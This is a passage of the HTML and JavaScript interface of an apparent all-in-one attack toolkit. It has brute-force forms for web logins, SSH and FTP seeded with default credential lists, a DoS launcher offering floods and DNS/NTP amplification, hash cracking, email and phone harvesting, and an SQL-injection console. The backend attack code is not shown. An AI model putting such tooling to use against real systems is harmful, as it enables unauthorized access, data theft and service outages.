                    <button class="tab" onclick="showBruteTab('basic')">Basic Auth</button>
                    <button class="tab" onclick="showBruteTab('custom')">Custom</button>
                </div>
                
                <div id="httpBrute" class="tab-content active">
                    <div class="form-grid">
                        <div class="form-group">
                            <label class="form-label">Login URL:</label>
                            <input type="text" id="bfHttpUrl" class="form-input" placeholder="http://example.com/login.php">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Username Field:</label>
                            <input type="text" id="bfHttpUserField" class="form-input" value="username">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Password Field:</label>
                            <input type="text" id="bfHttpPassField" class="form-input" value="password">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Success Indicator:</label>
                            <input type="text" id="bfHttpSuccess" class="form-input" placeholder="Welcome, Dashboard, etc">
                        </div>
                    </div>
                </div>
                
                <div id="basicBrute" class="tab-content">
                    <div class="form-grid">
                        <div class="form-group">
                            <label class="form-label">Protected URL:</label>
                            <input type="text" id="bfBasicUrl" class="form-input" placeholder="http://example.com/admin/">
                        </div>
                    </div>
                </div>
                
                <div id="customBrute" class="tab-content">
                    <div class="form-group">
                        <label class="form-label">Custom Request (JSON):</label>
                        <textarea id="bfCustomRequest" class="form-textarea" rows="6" placeholder='{"url": "http://example.com/login", "method": "POST", "data": {"user": "{USER}", "pass": "{PASS}"}, "success_codes": [200, 302]}'></textarea>
                    </div>
                </div>
                
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">Usernames (one per line):</label>
                        <textarea id="bfUsernames" class="form-textarea" rows="4">admin
root
user
administrator
test</textarea>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Passwords (one per line):</label>
                        <textarea id="bfPasswords" class="form-textarea" rows="4">admin
password
123456
12345678
qwerty
letmein</textarea>
                    </div>
                </div>
                
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">Threads:</label>
                        <input type="number" id="bfThreads" class="form-input" value="10" min="1" max="50">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Delay (ms):</label>
                        <input type="number" id="bfDelay" class="form-input" value="100" min="0" max="5000">
                    </div>
                </div>
                
                <div class="btn-group">
                    <button class="btn-danger" onclick="startBruteForce()">
                        <i class="fas fa-play"></i> Start Bruteforce
                    </button>
                    <button class="btn-danger" onclick="stopScan('brute')">
                        <i class="fas fa-stop"></i> Stop Attack
                    </button>
                </div>
                
                <div class="console-output" id="bfConsole">
                    <!-- Console output will appear here -->
                </div>
            </div>
            
            <!-- DoS Attack Tool -->
            <div id="dosTool" class="tool-section">
                <div class="section-header">
                    <h2><i class="fas fa-bolt"></i> DoS Attack Tool</h2>
                    <p>Denial of Service testing tool</p>
                </div>
                
                <div class="alert alert-danger">
                    <i class="fas fa-skull-crossbones"></i>
                    ☠️ EXTREME DANGER: REAL DoS attacks. ILLEGAL without authorization.
                </div>
                
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">Target URL:</label>
                        <input type="text" id="dosTarget" class="form-input" placeholder="http://example.com">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Attack Type:</label>
                        <select id="dosType" class="form-select">
                            <option value="http">HTTP Flood</option>
                            <option value="slowloris">Slowloris</option>
                            <option value="syn">SYN Flood</option>
                            <option value="udp">UDP Flood</option>
                            <option value="dns">DNS Amplification</option>
                            <option value="ntp">NTP Amplification</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Threads:</label>
                        <input type="number" id="dosThreads" class="form-input" value="100" min="1" max="1000">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Duration (seconds):</label>
                        <input type="number" id="dosDuration" class="form-input" value="30" min="1" max="300">
                    </div>
                </div>
                
                <div class="btn-group">
                    <button class="btn-danger" onclick="startDosAttack()">
                        <i class="fas fa-bomb"></i> Launch DoS Attack
                    </button>
                    <button class="btn-danger" onclick="stopScan('dos')">
                        <i class="fas fa-stop"></i> Stop Attack
                    </button>
                </div>
                
                <div class="console-output" id="dosConsole">
                    <!-- Console output will appear here -->
                </div>
            </div>
            
            <!-- SSH Bruteforce -->
            <div id="sshBrute" class="tool-section">
                <div class="section-header">
                    <h2><i class="fas fa-lock"></i> SSH Bruteforce</h2>
                    <p>Bruteforce SSH server credentials</p>
                </div>
                
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">SSH Server:</label>
                        <input type="text" id="sshTarget" class="form-input" placeholder="192.168.1.1:22">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Usernames:</label>
                        <textarea id="sshUsernames" class="form-textarea" rows="3">root
admin
user
ubuntu
centos</textarea>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Passwords:</label>
                        <textarea id="sshPasswords" class="form-textarea" rows="3">password
123456
admin
12345678
qwerty
toor</textarea>
                    </div>
                </div>
                
                <div class="btn-group">
                    <button class="btn-danger" onclick="startSshBrute()">
                        <i class="fas fa-key"></i> Start SSH Bruteforce
                    </button>
                </div>
                
                <div class="console-output" id="sshConsole">
                    <!-- Console output will appear here -->
                </div>
            </div>
            
            <!-- FTP Bruteforce -->
            <div id="ftpBrute" class="tool-section">
                <div class="section-header">
                    <h2><i class="fas fa-server"></i> FTP Bruteforce</h2>
                    <p>Bruteforce FTP server credentials</p>
                </div>
                
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">FTP Server:</label>
                        <input type="text" id="ftpTarget" class="form-input" placeholder="192.168.1.1:21">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Usernames:</label>
                        <textarea id="ftpUsernames" class="form-textarea" rows="3">anonymous
ftp
admin
root
user</textarea>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Passwords:</label>
                        <textarea id="ftpPasswords" class="form-textarea" rows="3">
password
123456
ftp
anonymous
admin</textarea>
                    </div>
                </div>
                
                <div class="btn-group">
                    <button class="btn-danger" onclick="startFtpBrute()">
                        <i class="fas fa-key"></i> Start FTP Bruteforce
                    </button>
                </div>
                
                <div class="console-output" id="ftpConsole">
                    <!-- Console output will appear here -->
                </div>
            </div>
            
            <!-- Web Crawler -->
            <div id="crawler" class="tool-section">
                <div class="section-header">
                    <h2><i class="fas fa-spider"></i> Web Crawler</h2>
                    <p>Crawl website and extract information</p>
                </div>
                
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">Start URL:</label>
                        <input type="text" id="crawlUrl" class="form-input" placeholder="http://example.com" value="http://example.com">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Depth:</label>
                        <input type="number" id="crawlDepth" class="form-input" value="2" min="1" max="5">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Threads:</label>
                        <input type="number" id="crawlThreads" class="form-input" value="10" min="1" max="50">
                    </div>
                </div>
                
                <div class="checkbox-group">
                    <label class="checkbox-label">
                        <input type="checkbox" id="crawlExtractLinks" checked>
                        <span>Extract Links</span>
                    </label>
                    <label class="checkbox-label">
                        <input type="checkbox" id="crawlExtractEmails">
                        <span>Extract Emails</span>
                    </label>
                    <label class="checkbox-label">
                        <input type="checkbox" id="crawlExtractPhones">
                        <span>Extract Phone Numbers</span>
                    </label>
                    <label class="checkbox-label">
                        <input type="checkbox" id="crawlCheckVulns">
                        <span>Check for Vulnerabilities</span>
                    </label>
                </div>
                
                <div class="btn-group">
                    <button class="btn" onclick="startCrawler()">
                        <i class="fas fa-play"></i> Start Crawling
                    </button>
                </div>
                
                <div class="results-container">
                    <div class="results-header">
                        <span>Crawler Results</span>
                        <span id="crawlStatus">Ready</span>
                    </div>
                    <div class="results-body" id="crawlResults">
                        <!-- Results will appear here -->
                    </div>
                </div>
            </div>
            
            <!-- Hash Tools -->
            <div id="hashTools" class="tool-section">
                <div class="section-header">
                    <h2><i class="fas fa-hashtag"></i> Hash Tools</h2>
                    <p>Generate and crack hashes</p>
                </div>
                
                <div class="tab-container">
                    <button class="tab active" onclick="showHashTab('generate')">Generate</button>
                    <button class="tab" onclick="showHashTab('crack')">Crack</button>
                    <button class="tab" onclick="showHashTab('verify')">Verify</button>
                </div>
                
                <div id="generateHash" class="tab-content active">
                    <div class="form-group">
                        <label class="form-label">Text to Hash:</label>
                        <input type="text" id="hashInput" class="form-input" placeholder="Enter text to hash" value="password123">
                    </div>
                    <div class="btn-group">
                        <button class="btn" onclick="generateMD5()">MD5</button>
                        <button class="btn" onclick="generateSHA1()">SHA1</button>
                        <button class="btn" onclick="generateSHA256()">SHA256</button>
                        <button class="btn" onclick="generateSHA512()">SHA512</button>
                        <button class="btn" onclick="generateAllHashes()">All Hashes</button>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Result:</label>
                        <textarea id="hashOutput" class="form-textarea" rows="6" readonly></textarea>
                    </div>
                </div>
                
                <div id="crackHash" class="tab-content">
                    <div class="form-group">
                        <label class="form-label">Hash to Crack:</label>
                        <input type="text" id="crackHashInput" class="form-input" placeholder="Enter hash to crack">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Hash Type:</label>
                        <select id="crackHashType" class="form-select">
                            <option value="md5">MD5</option>
                            <option value="sha1">SHA1</option>
                            <option value="sha256">SHA256</option>
                            <option value="sha512">SHA512</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Wordlist:</label>
                        <textarea id="crackWordlist" class="form-textarea" rows="4" placeholder="Enter wordlist (one per line)">password
123456
admin
12345678
qwerty
letmein</textarea>
                    </div>
                    <button class="btn" onclick="crackHash()">Crack Hash</button>
                    <div id="crackResult"></div>
                </div>
                
                <div id="verifyHash" class="tab-content">
                    <div class="form-group">
                        <label class="form-label">Text:</label>
                        <input type="text" id="verifyText" class="form-input" placeholder="Enter text">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Hash:</label>
                        <input type="text" id="verifyHash" class="form-input" placeholder="Enter hash">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Hash Type:</label>
                        <select id="verifyType" class="form-select">
                            <option value="md5">MD5</option>
                            <option value="sha1">SHA1</option>
                            <option value="sha256">SHA256</option>
                            <option value="sha512">SHA512</option>
                        </select>
                    </div>
                    <button class="btn" onclick="verifyHash()">Verify Hash</button>
                    <div id="verifyResult"></div>
                </div>
            </div>
            
            <!-- Encoder/Decoder -->
            <div id="encoder" class="tool-section">
                <div class="section-header">
                    <h2><i class="fas fa-code"></i> Encoder/Decoder</h2>
                    <p>Encode and decode data</p>
                </div>
                
                <div class="form-group">
                    <label class="form-label">Input:</label>
                    <textarea id="encodeInput" class="form-textarea" rows="4" placeholder="Enter text to encode/decode">Hello World</textarea>
                </div>
                
                <div class="btn-group">
                    <button class="btn" onclick="base64Encode()">Base64 Encode</button>
                    <button class="btn" onclick="base64Decode()">Base64 Decode</button>
                    <button class="btn" onclick="urlEncode()">URL Encode</button>
                    <button class="btn" onclick="urlDecode()">URL Decode</button>
                    <button class="btn" onclick="htmlEncode()">HTML Encode</button>
                    <button class="btn" onclick="htmlDecode()">HTML Decode</button>
                    <button class="btn" onclick="hexEncode()">Hex Encode</button>
                    <button class="btn" onclick="hexDecode()">Hex Decode</button>
                </div>
                
                <div class="form-group">
                    <label class="form-label">Result:</label>
                    <textarea id="encodeOutput" class="form-textarea" rows="6" readonly></textarea>
                </div>
            </div>
            
            <!-- Network Tools -->
            <div id="networkTools" class="tool-section">
                <div class="section-header">
                    <h2><i class="fas fa-wifi"></i> Network Tools</h2>
                    <p>Network analysis and testing tools</p>
                </div>
                
                <div class="tab-container">
                    <button class="tab active" onclick="showNetworkTab('ping')">Ping</button>
                    <button class="tab" onclick="showNetworkTab('traceroute')">Traceroute</button>
                    <button class="tab" onclick="showNetworkTab('whois')">WHOIS</button>
                    <button class="tab" onclick="showNetworkTab('geoip')">GeoIP</button>
                </div>
                
                <div id="pingTab" class="tab-content active">
                    <div class="form-group">
                        <label class="form-label">Target:</label>
                        <input type="text" id="pingTarget" class="form-input" placeholder="example.com or 8.8.8.8" value="8.8.8.8">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Count:</label>
                        <input type="number" id="pingCount" class="form-input" value="4" min="1" max="20">
                    </div>
                    <button class="btn" onclick="startPing()">Ping</button>
                    <div id="pingResult"></div>
                </div>
                
                <div id="tracerouteTab" class="tab-content">
                    <div class="form-group">
                        <label class="form-label">Target:</label>
                        <input type="text" id="traceTarget" class="form-input" placeholder="example.com">
                    </div>
                    <button class="btn" onclick="startTraceroute()">Traceroute</button>
                    <div id="traceResult"></div>
                </div>
                
                <div id="whoisTab" class="tab-content">
                    <div class="form-group">
                        <label class="form-label">Domain/IP:</label>
                        <input type="text" id="whoisTarget" class="form-input" placeholder="example.com">
                    </div>
                    <button class="btn" onclick="startWhois()">WHOIS Lookup</button>
                    <div id="whoisResult"></div>
                </div>
                
                <div id="geoipTab" class="tab-content">
                    <div class="form-group">
                        <label class="form-label">IP Address:</label>
                        <input type="text" id="geoipTarget" class="form-input" placeholder="8.8.8.8">
                    </div>
                    <button class="btn" onclick="startGeoIP()">GeoIP Lookup</button>
                    <div id="geoipResult"></div>
                </div>
            </div>
            
            <!-- Header Analyzer -->
            <div id="headers" class="tool-section">
                <div class="section-header">
                    <h2><i class="fas fa-heading"></i> Header Analyzer</h2>
                    <p>Analyze HTTP headers for security issues</p>
                </div>
                
                <div class="form-group">
                    <label class="form-label">URL:</label>
                    <input type="text" id="headerUrl" class="form-input" placeholder="http://example.com" value="http://example.com">
                </div>
                
                <button class="btn" onclick="analyzeHeaders()">Analyze Headers</button>
                
                <div class="results-container">
                    <div class="results-header">
                        <span>Header Analysis Results</span>
                    </div>
                    <div class="results-body" id="headerResults">
                        <!-- Results will appear here -->
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <p>Stable Security Scanner v4.0 | For authorized security testing only | Charlie Syllas & Jaguar 45 ©2026</p>
        <p>Deployed on: {{ deployment_platform }} | Environment: {{ deployment_env }}</p>
    </div>
    
    <script>
        // Global variables
        let activeTool = 'infoGathering';
        let activeScans = 0;
        let foundVulns = 0;
        let startTime = new Date();
        let scanIntervals = {};
        
        // Matrix background
        const canvas = document.getElementById('matrixCanvas');
        const ctx = canvas.getContext('2d');
        
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        
        window.addEventListener('resize', resizeCanvas);
        resizeCanvas();
        
        const chars = "01";
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];
        
        for(let i = 0; i < columns; i++) {
            drops[i] = Math.random() * canvas.height;
        }
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#0F0';
            ctx.font = fontSize + 'px monospace';
            
            for(let i = 0; i < drops.length; i++) {
                const char = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(char, i * fontSize, drops[i] * fontSize);
                
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        
        setInterval(drawMatrix, 50);
        
        // Tool navigation
        function showTool(toolId) {
            // Hide all tools
            document.querySelectorAll('.tool-section').forEach(tool => {
                tool.classList.remove('active');
            });
            
            // Remove active class from all buttons
            document.querySelectorAll('.tool-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            
            // Show selected tool
            document.getElementById(toolId).classList.add('active');
            
            // Set active button
            event.target.classList.add('active');
            
            activeTool = toolId;
        }
        
        // Tab navigation for brute force
        function showBruteTab(tabId) {
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });
            
            event.target.classList.add('active');
            document.getElementById(tabId + 'Brute').classList.add('active');
        }
        
        // Tab navigation for hash tools
        function showHashTab(tabId) {
            document.querySelectorAll('#hashTools .tab').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('#hashTools .tab-content').forEach(content => {
                content.classList.remove('active');
            });
            
            event.target.classList.add('active');
            document.getElementById(tabId + 'Hash').classList.add('active');
        }
        
        // Tab navigation for network tools
        function showNetworkTab(tabId) {
            document.querySelectorAll('#networkTools .tab').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('#networkTools .tab-content').forEach(content => {
                content.classList.remove('active');
            });
            
            event.target.classList.add('active');
            document.getElementById(tabId + 'Tab').classList.add('active');
        }
        
        // Update statistics
        function updateStats() {
            document.getElementById('activeScans').textContent = activeScans;
            document.getElementById('foundVulns').textContent = foundVulns;
            
            const now = new Date();
            const diff = Math.floor((now - startTime) / 1000);
            const minutes = Math.floor(diff / 60).toString().padStart(2, '0');
            const seconds = (diff % 60).toString().padStart(2, '0');
            document.getElementById('uptime').textContent = `${minutes}:${seconds}`;
        }
        
        setInterval(updateStats, 1000);
        
        // Utility functions
        function showLoading(elementId, message = 'Scanning...') {
            const element = document.getElementById(elementId);
            element.innerHTML = `
                <div class="loading">
                    <div class="spinner"></div>
                    <div>${message}</div>
                </div>
            `;
        }
        
        function addResult(elementId, content, type = 'info') {
            const element = document.getElementById(elementId);
            const div = document.createElement('div');
            div.className = `result-item ${type}`;
            div.innerHTML = content;
            element.appendChild(div);
            element.scrollTop = element.scrollHeight;
        }
        
        function clearResults(elementId) {
            document.getElementById(elementId).innerHTML = '';
        }
        
        function addConsole(elementId, message, type = 'info') {
            const element = document.getElementById(elementId);
            const now = new Date();
            const time = `[${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}]`;
            
            let color = '#00ff00';
            if(type === 'error') color = '#ff0000';
            if(type === 'warning') color = '#ffff00';
            if(type === 'success') color = '#00ff00';
            if(type === 'info') color = '#00ffff';
            
            const div = document.createElement('div');
            div.className = 'log-entry';
            div.innerHTML = `<span style="color: #666">${time}</span> <span style="color: ${color}">${message}</span>`;
            element.appendChild(div);
            element.scrollTop = element.scrollHeight;
        }
        
        function updateProgress(elementId, percent) {
            const element = document.getElementById(elementId);
            if(element) {
                element.style.width = percent + '%';
            }
        }
        
        function updateStatus(elementId, status) {
            const element = document.getElementById(elementId);
            if(element) {
                element.textContent = status;
            }
        }
        
        // API call wrapper
        async function apiCall(endpoint, data, progressId = null, statusId = null) {
            try {
                activeScans++;
                if(statusId) updateStatus(statusId, 'Scanning...');
                
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                
                const result = await response.json();
                
                activeScans--;
                if(statusId) updateStatus(statusId, 'Completed');
                
                if(result.error) {
                    throw new Error(result.error);
                }
                
                return result;
                
            } catch(error) {
                activeScans--;
                if(statusId) updateStatus(statusId, 'Error');
                throw error;
            }
        }
        
        // Tool functions
        async function startInfoGathering() {
            const target = document.getElementById('infoTarget').value;
            const scanType = document.getElementById('infoType').value;
            
            if(!target) {
                alert('Please enter a target');
                return;
            }
            
            showLoading('infoResults');
            
            try {
                const result = await apiCall('/api/info', {
                    target: target,
                    scan_type: scanType,
                    options: {
                        dns: document.getElementById('infoDNS').checked,
                        ports: document.getElementById('infoPorts').checked,
                        whois: document.getElementById('infoWhois').checked,
                        tech: document.getElementById('infoTech').checked,
                        ssl: document.getElementById('infoSSL').checked
                    }
                }, null, 'infoStatus');
                
                clearResults('infoResults');
                
                // Display results
                if(result.ip) {
                    addResult('infoResults', `
                        <div class="result-title">IP Address</div>
                        <div class="result-content">${result.ip}</div>
                    `, 'success');
                }
                
                if(result.hostname) {
                    addResult('infoResults', `
                        <div class="result-title">Hostname</div>
                        <div class="result-content">${result.hostname}</div>
                    `, 'success');
                }
                
                if(result.dns_records && result.dns_records.length > 0) {
                    addResult('infoResults', `
                        <div class="result-title">DNS Records</div>
                        <div class="result-content">
                            ${result.dns_records.map(record => `<div>${record.type}: ${record.value}</div>`).join('')}
                        </div>
                    `, 'info');
                }
                
                if(result.open_ports && result.open_ports.length > 0) {
                    addResult('infoResults', `
                        <div class="result-title">Open Ports</div>
                        <div class="result-content">
                            ${result.open_ports.map(port => `<div>Port ${port.port}: ${port.service} (${port.state})</div>`).join('')}
                        </div>
                    `, 'info');
                }
                
                if(result.technologies && result.technologies.length > 0) {
                    addResult('infoResults', `
                        <div class="result-title">Technologies Detected</div>
                        <div class="result-content">
                            ${result.technologies.map(tech => `<div>${tech}</div>`).join('')}
                        </div>
                    `, 'info');
                }
                
                if(result.whois) {
                    addResult('infoResults', `
                        <div class="result-title">WHOIS Information</div>
                        <div class="result-content">
                            ${Object.entries(result.whois).map(([key, value]) => `<div><strong>${key}:</strong> ${value}</div>`).join('')}
                        </div>
                    `, 'info');
                }
                
                if(result.ssl_info) {
                    addResult('infoResults', `
                        <div class="result-title">SSL/TLS Information</div>
                        <div class="result-content">
                            ${Object.entries(result.ssl_info).map(([key, value]) => `<div><strong>${key}:</strong> ${value}</div>`).join('')}
                        </div>
                    `, 'info');
                }
                
            } catch(error) {
                addResult('infoResults', `
                    <div class="result-title">Error</div>
                    <div class="result-content">${error.message}</div>
                `, 'error');
            }
        }
        
        async function startPortScan() {
            const target = document.getElementById('portTarget').value;
            const scanType = document.getElementById('portType').value;
            const portRange = document.getElementById('portRange').value;
            const timeout = document.getElementById('portTimeout').value;
            
            if(!target) {
                alert('Please enter a target');
                return;
            }
            
            showLoading('portResults');
            updateProgress('portProgress', 0);
            
            try {
                const result = await apiCall('/api/portscan', {
                    target: target,
                    scan_type: scanType,
                    port_range: portRange,
                    timeout: timeout
                }, 'portProgress', 'portStatus');
                
                clearResults('portResults');
                
                addResult('portResults', `
                    <div class="result-title">Port Scan Results</div>
                    <div class="result-content">
                        <div>Target: ${result.target}</div>
                        <div>IP: ${result.ip}</div>
                        <div>Scan Time: ${result.scan_time}s</div>
                        <div>Open Ports: ${result.open_ports.length}</div>
                    </div>
                `, 'info');
                
                if(result.open_ports.length > 0) {
                    // Display ports in a grid
                    const portsGrid = document.createElement('div');
                    portsGrid.className = 'port-list';
                    
                    result.open_ports.forEach(port => {
                        const portDiv = document.createElement('div');
                        portDiv.className = 'port-item open';
                        portDiv.innerHTML = `
                            <div><strong>${port.port}</strong></div>
                            <div>${port.service}</div>
                            <div style="font-size: 0.8em; color: #666">${port.state}</div>
                        `;
                        portsGrid.appendChild(portDiv);
                    });
                    
                    addResult('portResults', `
                        <div class="result-title">Open Ports</div>
                    `, 'success');
                    
                    document.getElementById('portResults').appendChild(portsGrid);
                } else {
                    addResult('portResults', `
                        <div class="result-title">No Open Ports Found</div>
                        <div class="result-content">All scanned ports are closed or filtered.</div>
                    `, 'warning');
                }
                
                updateProgress('portProgress', 100);
                
            } catch(error) {
                addResult('portResults', `
                    <div class="result-title">Error</div>
                    <div class="result-content">${error.message}</div>
                `, 'error');
                updateProgress('portProgress', 0);
            }
        }
        
        async function startDNSEnum() {
            const target = document.getElementById('dnsTarget').value;
            const types = Array.from(document.getElementById('dnsTypes').selectedOptions).map(opt => opt.value);
            
            if(!target) {
                alert('Please enter a domain');
                return;
            }
            
            showLoading('dnsResults');
            
            try {
                const result = await apiCall('/api/dns', {
                    domain: target,
                    record_types: types
                }, null, 'dnsStatus');
                
                clearResults('dnsResults');
                
                addResult('dnsResults', `
                    <div class="result-title">DNS Enumeration Results</div>
                    <div class="result-content">
                        <div>Domain: ${result.domain}</div>
                        <div>Records Found: ${Object.values(result.records).flat().length}</div>
                    </div>
                `, 'info');
                
                for(const [type, records] of Object.entries(result.records)) {
                    if(records.length > 0) {
                        addResult('dnsResults', `
                            <div class="result-title">${type} Records</div>
                            <div class="result-content">
                                ${records.map(record => `<div>${record}</div>`).join('')}
                            </div>
                        `, 'success');
                    }
                }
                
            } catch(error) {
                addResult('dnsResults', `
                    <div class="result-title">Error</div>
                    <div class="result-content">${error.message}</div>
                `, 'error');
            }
        }
        
        async function startSubdomainScan() {
            const target = document.getElementById('subTarget').value;
            const wordlist = document.getElementById('subWordlist').value;
            const threads = document.getElementById('subThreads').value;
            
            if(!target) {
                alert('Please enter a domain');
                return;
            }
            
            showLoading('subResults');
            
            try {
                const result = await apiCall('/api/subdomain', {
                    domain: target,
                    wordlist: wordlist,
                    threads: threads
                }, null, 'subStatus');
                
                clearResults('subResults');
                
                addResult('subResults', `
                    <div class="result-title">Subdomain Scan Results</div>
                    <div class="result-content">
                        <div>Domain: ${result.domain}</div>
                        <div>Subdomains Found: ${result.subdomains.length}</div>
                        <div>Scan Time: ${result.scan_time}s</div>
                    </div>
                `, 'info');
                
                if(result.subdomains.length > 0) {
                    addResult('subResults', `
                        <div class="result-title">Found Subdomains</div>
                        <div class="result-content">
                            ${result.subdomains.map(sub => `<div>${sub}</div>`).join('')}
                        </div>
                    `, 'success');
                } else {
                    addResult('subResults', `
                        <div class="result-title">No Subdomains Found</div>
                        <div class="result-content">No subdomains were discovered for this domain.</div>
                    `, 'warning');
                }
                
            } catch(error) {
                addResult('subResults', `
                    <div class="result-title">Error</div>
                    <div class="result-content">${error.message}</div>
                `, 'error');
            }
        }
        
        async function startDirScan() {
            const target = document.getElementById('dirTarget').value;
            const wordlist = document.getElementById('dirWordlist').value;
            const extensions = document.getElementById('dirExtensions').value;
            const threads = document.getElementById('dirThreads').value;
            
            if(!target) {
                alert('Please enter a URL');
                return;
            }
            
            showLoading('dirResults');
            updateProgress('dirProgress', 0);
            
            try {
                const result = await apiCall('/api/dirscan', {
                    url: target,
                    wordlist: wordlist,
                    extensions: extensions.split(',').map(ext => ext.trim()).filter(ext => ext),
                    threads: threads
                }, 'dirProgress', 'dirStatus');
                
                clearResults('dirResults');
                
                addResult('dirResults', `
                    <div class="result-title">Directory Scan Results</div>
                    <div class="result-content">
                        <div>URL: ${result.url}</div>
                        <div>Directories Found: ${result.found.length}</div>
                        <div>Scan Time: ${result.scan_time}s</div>
                    </div>
                `, 'info');
                
                if(result.found.length > 0) {
                    result.found.forEach(item => {
                        addResult('dirResults', `
                            <div class="result-title">${item.status} ${item.path}</div>
                            <div class="result-content">
                                <div>URL: <a href="${item.url}" target="_blank">${item.url}</a></div>
                                <div>Size: ${item.size} bytes</div>
                                ${item.title ? `<div>Title: ${item.title}</div>` : ''}
                            </div>
                        `, 'success');
                    });
                } else {
                    addResult('dirResults', `
                        <div class="result-title">No Directories Found</div>
                        <div class="result-content">No accessible directories or files were found.</div>
                    `, 'warning');
                }
                
                updateProgress('dirProgress', 100);
                
            } catch(error) {
                addResult('dirResults', `
                    <div class="result-title">Error</div>
                    <div class="result-content">${error.message}</div>
                `, 'error');
                updateProgress('dirProgress', 0);
            }
        }
        
        async function startVulnScan() {
            const target = document.getElementById('vulnTarget').value;
            const depth = document.getElementById('vulnDepth').value;
            
            if(!target) {
                alert('Please enter a URL');
                return;
            }
            
            showLoading('vulnResults');
            
            try {
                const result = await apiCall('/api/vulnscan', {
                    url: target,
                    depth: depth,
                    checks: {
                        sqli: document.getElementById('vulnSqli').checked,
                        xss: document.getElementById('vulnXss').checked,
                        lfi: document.getElementById('vulnLfi').checked,
                        cmd: document.getElementById('vulnCmd').checked,
                        headers: document.getElementById('vulnHeaders').checked,
                        ssl: document.getElementById('vulnSsl').checked,
                        xxe: document.getElementById('vulnXxe').checked,
                        ssrf: document.getElementById('vulnSsrf').checked
                    }
                }, null, 'vulnStatus');
                
                clearResults('vulnResults');
                
                addResult('vulnResults', `
                    <div class="result-title">Vulnerability Scan Results</div>
                    <div class="result-content">
                        <div>URL: ${result.url}</div>
                        <div>Vulnerabilities Found: ${result.vulnerabilities.length}</div>
                        <div>Scan Time: ${result.scan_time}s</div>
                    </div>
                `, result.vulnerabilities.length > 0 ? 'error' : 'success');
                
                if(result.vulnerabilities.length > 0) {
                    result.vulnerabilities.forEach(vuln => {
                        addResult('vulnResults', `
                            <div class="result-title">[${vuln.severity.toUpperCase()}] ${vuln.name}</div>
                            <div class="result-content">
                                <div>Type: ${vuln.type}</div>
                                <div>Description: ${vuln.description}</div>
                                ${vuln.location ? `<div>Location: ${vuln.location}</div>` : ''}
                                ${vuln.payload ? `<div>Payload: <code>${vuln.payload}</code></div>` : ''}
                                ${vuln.recommendation ? `<div>Recommendation: ${vuln.recommendation}</div>` : ''}
                            </div>
                        `, vuln.severity === 'critical' || vuln.severity === 'high' ? 'error' : 'warning');
                    });
                    
                    foundVulns += result.vulnerabilities.length;
                } else {
                    addResult('vulnResults', `
                        <div class="result-title">No Vulnerabilities Found</div>
                        <div class="result-content">No vulnerabilities were detected during the scan.</div>
                    `, 'success');
                }
                
            } catch(error) {
                addResult('vulnResults', `
                    <div class="result-title">Error</div>
                    <div class="result-content">${error.message}</div>
                `, 'error');
            }
        }
        
        async function startSqliScan() {
            const target = document.getElementById('sqliTarget').value;
            const method = document.getElementById('sqliMethod').value;
            const dbType = document.getElementById('sqliDB').value;
            
            if(!target) {
                alert('Please enter a target URL');
                return;
            }
            
            if(!confirm('This will perform REAL SQL injection tests. Are you authorized to test this target?')) {
                return;
            }
            
            addConsole('sqliConsole', `Starting SQL injection test on ${target}...`, 'info');
            
            try {
                const result = await apiCall('/api/sqli', {
                    url: target,
                    method: method,
                    db_type: dbType
                });
                
                if(result.vulnerable) {
                    addConsole('sqliConsole', `⚠️ VULNERABLE to SQL Injection!`, 'error');
                    addConsole('sqliConsole', `Type: ${result.type}`, 'warning');
                    addConsole('sqliConsole', `Parameter: ${result.parameter}`, 'warning');
                    addConsole('sqliConsole', `Payload: ${result.payload}`, 'warning');
                    
                    if(result.data) {
                        addConsole('sqliConsole', `Extracted Data: ${JSON.stringify(result.data, null, 2)}`, 'warning');
                    }
                    
                    foundVulns++;
                } else {
                    addConsole('sqliConsole', `✓ Not vulnerable to SQL Injection`, 'success');
                }
                
                addConsole('sqliConsole', `Payloads tested: ${result.payloads_tested}`, 'info');
                addConsole('sqliConsole', `Scan time: ${result.scan_time}s`, 'info');
                
            } catch(error) {
